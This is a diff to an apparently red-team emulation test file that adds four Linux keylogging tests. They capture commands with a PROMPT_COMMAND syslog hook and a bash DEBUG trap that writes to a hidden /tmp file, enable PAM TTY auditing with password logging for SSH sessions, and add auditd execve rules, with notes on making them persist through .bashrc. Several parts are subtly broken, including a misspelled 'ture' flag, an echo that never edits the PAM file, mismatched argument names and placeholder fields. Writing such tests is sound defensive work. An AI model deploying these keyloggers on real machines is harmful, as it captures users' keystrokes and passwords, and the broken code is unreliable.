@@ -51,3 +51,127 @@ atomic_tests:
       sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
     name: sh
     elevation_required: true
+
+- name: Logging bash history to syslog
+  description: |
+    There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable "if set" will be executed before the PS1 variable and can be configured to write the latest "bash history" entries to the syslog.
+
+    To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh 
+  dependencies: 
+    - description: |
+        This test requires to be run in a bash shell and that logger and tee are installed.
+      prereq_command: | 
+        if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+        if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+        if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+      get_prereq_command: | 
+        echo ""
+  executor:
+    name: sh
+    elevation_required: ture
+    command: | 
+      PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+      echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+      tail /var/log/syslog
+    cleanup_command: | 
+      unset PROMPT_COMMAND
+
+- name: Bash session based keylogger
+  description: |
+    When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = "echo $BASH_COMMAND". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. 
+
+    To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ 
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh 
+  dependencies: 
+    - description: |
+        This test requires to be run in a bash shell
+      prereq_command: | 
+        if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+      get_prereq_command: | 
+        echo ""
+  input_arguments:
+    output_file:
+      name: output_file
+      description: File to store captured commands
+      type: String
+      default: /tmp/.keyboard.log
+  executor:
+    name: command_prompt
+    elevation_required: false 
+    command: | 
+      trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+      echo "Hello World!"
+      cat #{output_file}
+    cleanup_command: | 
+      rm #{output_file}
+
+- name: SSHD PAM keylogger
+  description: |
+    Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh 
+  dependencies: 
+    - description: |
+        This test requires sshd and auditd
+      prereq_command: | 
+        if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+        if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+      get_prereq_command: | 
+        echo ""
+  input_arguments:
+    output_file:
+      name: user_account
+      description: Basic ssh user account for testing
+      type: account
+      default: user_account
+  executor:
+    name: command_prompt
+    elevation_required: true 
+    command: | 
+      cp -v /etc/pam.d/sshd /tmp/
+      echo >> "session required pam_tty_audit.so disable=* enable=* open_only log_passwd"
+      systemctl restart sshd
+      systemctl restart auditd
+      ssh #{user_account}@localhost 
+      whoami
+      sudo su
+      whoami
+      exit
+      exit
+    cleanup_command: | 
+      cp -fv /tmp/sshd /etc/pam.d/
+
+- name: Auditd keylogger
+  description: |
+    The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. 
+  supported_platforms:
+    - linux
+  dependency_executor_name: sh 
+  dependencies: 
+    - description: |
+        This test requires sshd and auditd
+      prereq_command: | 
+        if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+      get_prereq_command: | 
+        echo ""
+  input_arguments:
+    output_file:
+      description: description
+      type: type
+      default: default
+  executor:
+    name: command_prompt
+    elevation_required: true 
+    command: | 
+      auditctl -a always,exit -F arch=b64 -S execve -k CMDS 
+      auditctl -a always,exit -F arch=b32 -S execve -k CMDS
+      whoami; ausearch -i --start $(date +"%d/%m/%y %H:%M:%S") 
+    cleanup_command: | 
+      systemctl restart auditd
+
